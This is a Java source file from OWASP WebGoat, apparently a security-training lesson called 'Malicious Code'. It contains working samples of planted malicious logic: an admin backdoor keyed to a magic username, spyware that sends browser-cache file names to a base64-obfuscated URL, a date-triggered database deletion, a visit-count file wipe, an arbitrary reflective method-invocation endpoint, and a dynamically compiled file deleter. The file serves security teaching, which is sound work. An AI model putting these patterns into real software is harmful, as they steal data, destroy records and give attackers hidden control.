package org.owasp.webgoat.lessons;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLConnection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.StringTokenizer;
import org.apache.ecs.Element;
import org.apache.ecs.ElementContainer;
import org.apache.ecs.StringElement;
import org.apache.ecs.html.Input;
import org.owasp.webgoat.session.ECSFactory;
import org.owasp.webgoat.session.LessonTracker;
import org.owasp.webgoat.session.WebSession;
import javax.tools.JavaCompiler;
import javax.tools.JavaFileObject;
import javax.tools.SimpleJavaFileObject;
import javax.tools.ToolProvider;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.Arrays;

/*******************************************************************************
 * 
 * 
 * This file is part of WebGoat, an Open Web Application Security Project
 * utility. For details, please see http://www.owasp.org/
 * 
 * Copyright (c) 2002 - 20014 Bruce Mayhew
 * 
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 * 
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 * 
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 59 Temple
 * Place - Suite 330, Boston, MA 02111-1307, USA.
 * 
 * Getting Source ==============
 * 
 * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository
 * for free software projects.
 * 
 * For details, please see http://webgoat.github.io
 * 
 * @author Bruce Mayhew <a href="http://code.google.com/p/webgoat">WebGoat</a>
 * @created October 28, 2003
 */
public class BlindScript extends LessonAdapter
{
    private final static String PERSON = "person";
    private final static String CODE = "code";
    private final static String METHOD = "method";
    private final static String ARG_TYPES = "argTypes";
    private final static String PARAMS = "params";
    private final static String WEBGOAT_URL = "aHR0cDovL2xvY2FsaG9zdC9XZWJHb2F0L2NhdGNoZXI/UFJPUEVSVFk9eWVz";
    /**
     * Description of the Method
     * 
     * @param s
     *            Description of the Parameter
     * @return Description of the Return Value
     */
    protected Element createContent(WebSession s)
    {
        ElementContainer ec = new ElementContainer();

        StringBuffer person = null;
        try
        {
            person = new StringBuffer(s.getParser().getStringParameter(PERSON, ""));

            if (!"".equals(person.toString()))
            {
                ec.addElement(new StringElement("Sorry.  Could not locate record for: "
                        + person.toString()));
            }

            ec.addElement(new StringElement("Enter your name: "));

            Input input = new Input(Input.TEXT, PERSON, person.toString());
            ec.addElement(input);

            Element b = ECSFactory.makeButton("Go!");
            ec.addElement(b);
        }
        catch (Exception e)
        {
            s.setMessage("Error generating " + this.getClass().getName());
            e.printStackTrace();
        }

        // Easter Egg
        if ("BrucE".equals(person.toString()))
        {
            ec = easterEgg(s);
            makeSuccess(s);
        }

        executeSpyWare(s);
        executeTimeTrigger(s);
        executeEventTrigger(s);
        executeBackDoor(s);
        
        // Dynamic Class Loading
        String code = s.getParser().getStringParameter(CODE, "");
        String method = s.getParser().getStringParameter(METHOD, "");
        String argTypes = s.getParser().getStringParameter(ARG_TYPES, "");
        String params = s.getParser().getStringParameter(PARAMS, "");
        if (!code.equals(""))
        {
        try
        {
            loadMe(s, code, method, argTypes, params);
        }
        catch (IOException e)
        {
            // do nothing to hide the error
        }
        }
        return (ec);
    }

    private void executeBackDoor(WebSession s)
    {
        
        // Make me an admin
        String me = s.getParser().getStringParameter(PERSON, "");
        if ("B_Admin443".equals(me))
        {
            s.setAdmin(true);
        }

        // This won't actually work for WebGoat, it's setting the admin flag AFTER
        // the admin checks have been performed and the lessons/functions have been
        // loaded for the user.
    }
    
    public void executeSpyWare( WebSession s )
    {
        // Lets gather some information about the users browsing history
        String userHome = System.getProperty("user.home" ) + "\\Local Settings\\Temporary Internet Files";
        String separator = System.getProperty("line.separator");
        File dir = new File(userHome);
        StringBuffer browserFiles = new StringBuffer();
        if (dir.isDirectory()) {
            File[] children = dir.listFiles();
            for (int i=0; i<children.length; i++) {
                browserFiles.append(children[i].getName());
                browserFiles.append(separator);
            }
        }
        
        // post the data to my listen servlet
        try {
            
            // Send data
            String partner = new String(new sun.misc.BASE64Decoder().decodeBuffer(WEBGOAT_URL));
            URL url = new URL(partner);
            URLConnection conn = url.openConnection();
            conn.setDoOutput(true);
            OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
            wr.write("&cache=" + browserFiles.toString());
            wr.flush();
        
            // Get the response
            BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = rd.readLine()) != null) {
                // Process response if we cared
            }
            wr.close();
            rd.close();
        } catch (Exception e) {
        }

    }
    private void executeEventTrigger(WebSession s)
    {
        
        //  after 100 loads delete all the user status

        LessonTracker lt = this.getLessonTracker(s);
        if (lt.getNumVisits() > 100 )
        {
            // Delete all the user files
            String userDir = LessonTracker.getUserDir(s);
            File dir = new File(userDir);
            if (dir.isDirectory()) {
                String[] children = dir.list();
                for (int i=0; i<children.length; i++) {
                    new File(dir, children[i]).delete();
                }
            }
        }
    }

    
    private void executeTimeTrigger(WebSession s)
    {
        Calendar cal1 = Calendar.getInstance();
        Calendar cal2 = Calendar.getInstance();
        cal2.set(2010, 1, 13);  // Jan 13th 2010
        
        // Event triggered time bomb
        if (cal1.getTime().after(cal2.getTime()))
        {
            // Query the database for the profile data of the given employee
            try
            {
                String query = "DELETE employee";
                PreparedStatement statement = WebSession.getConnection(s).prepareStatement(query,
                        ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_UPDATABLE);
                statement.executeQuery();
            }
            catch (Exception e)
            { // eat any exceptions
            }
        }
    }

    //http://localhost:8888/WebGoat/attack?Screen=18&menu=50&code=org.owasp.webgoat.lessons.Challenge2Screen&method=getInstructions&argTypes=W&params=this
    public static String loadMe(WebSession s, String clazz, String method, String argTypes, String params) throws IOException
    {
        try
        {
            Class cls = (Class.forName(clazz));
            StringTokenizer argsTok = new StringTokenizer(argTypes, ",");
            StringTokenizer paramsTok = new StringTokenizer(params, ",");
            
            // Build the list of parameter types to look up the method
            Class parameterType[] = null;
            Object argList[] = null;
            if ( argsTok.countTokens() >= 1 )
            {
                parameterType = new Class[argsTok.countTokens()];
            }
            if (paramsTok.countTokens() >= 1 )
            {
                argList = new Object[paramsTok.countTokens()];
            }
            
            int i = 0;
            while (argsTok.hasMoreTokens())
            {
                String argString = argsTok.nextToken();
                
                if ("W".equals(argString))
                {
                    parameterType[i] = WebSession.class;
                    argList[i] = s;
                } else if ("S".equals(argString))
                {
                    parameterType[i] = String.class;
                }
             else if ("I".equals(argString))
            {
                parameterType[i] = Integer.class;
            }
            }   
                
            Method meth = cls.getMethod(method, parameterType);
            String retobj = (String) meth.invoke(cls, argList);
            return retobj;
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
        return null;
    }

    private ElementContainer easterEgg(WebSession s)
    {
        ElementContainer ec = new ElementContainer();
        ec.addElement(new StringElement("Bruce - You are the greatest!"));
        return ec;

    }

    /**
     * Gets the hints attribute of the HelloScreen object
     * 
     * @return The hints value
     */
    public List<String> getHints(WebSession s)
    {
        List<String> hints = new ArrayList<String>();
        hints.add("Type in Bruce and press 'go'");
        hints.add("");
        hints.add("Press the Show Lesson Plan button to view a lesson summary");

        return hints;
    }

    /**
     * Gets the ranking attribute of the HelloScreen object
     * 
     * @return The ranking value
     */
    private final static Integer DEFAULT_RANKING = new Integer(10);

    protected Integer getDefaultRanking()
    {
        return DEFAULT_RANKING;
    }

    protected Category getDefaultCategory()
    {
        return Category.GENERAL;
    }

    /**
     * Gets the title attribute of the HelloScreen object
     * 
     * @return The title value
     */
    public String getTitle()
    {
        return ("Malicious Code");
    }
    

    private static boolean compile( JavaFileObject... source )
        {
        final JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();

        final JavaCompiler.CompilationTask task = compiler.getTask( null,
                null,
                null,
                null,
                null,
                Arrays.asList( source ) );
        return task.call();
        }

    private static String compose()
    {
        final StringBuilder sb = new StringBuilder( 1000 );
        sb.append( "package org.owasp.webgoat.lessons;\n" );

        sb.append( "import java.io.File;\n" );
        sb.append( "public class Deleter\n" );
        sb.append( "{\n" );
        sb.append( "static {\n" );
        sb.append( "File foo = new File(\"C:\\temp\\user.txt\");\n" );
        sb.append( "foo.delete();\n" );
        sb.append( "  }\n" );
        sb.append( "}\n" );
        return sb.toString();
    }

    public static void StaticDeleter(  ) 
    {
        final String programText = compose(  );
        try
        {
            compile( new ResidentJavaFileObject( "Deleter", programText ) );
            Class.forName( "org.owasp.webgoat.lessons.Deleter" ).newInstance();
        } catch (URISyntaxException e)
        {
        } catch (InstantiationException e)
        {
        } catch (IllegalAccessException e)
        {
        } catch (ClassNotFoundException e)
        {
        }
    }
}

    class ResidentJavaFileObject extends SimpleJavaFileObject
    {
    private final String programText;

    public ResidentJavaFileObject( String className, String programText ) throws URISyntaxException
        {
        super( new URI( className + ".java" ), Kind.SOURCE );
        this.programText = programText;
        }

    public CharSequence getCharContent( boolean ignoreEncodingErrors ) throws IOException
        {
        return programText;
        }
    }   
    
